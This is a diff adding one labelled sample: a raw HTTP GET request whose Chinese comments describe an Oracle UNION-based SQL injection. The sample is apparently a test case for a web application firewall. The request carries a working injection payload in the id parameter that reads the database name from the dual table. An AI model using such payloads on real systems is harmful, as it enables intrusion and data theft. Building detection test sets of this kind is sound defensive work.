@@ -1,0 +1,9 @@
+# SQL注入_GET_oracle_普通注入-06506298
+# 攻击者基于UNION查询，将"union select sys.database_name from dual"语句注入到 SQL 查询参数中，目的是从虚拟表dual中获取数据库名称信息。
+GET /?id=1%20union%20SELECT%20SYS.DATABASE_NAME%20FROM%20DUAL&bid=hd_tag_m8mv249f HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv249f
+RM-PRO-Token: bb50c69fcb9fa35161c17db8a6c2a50f
+RM-PRO-Time: 1742808370659
+User-Agent: curl/7.83.1
+
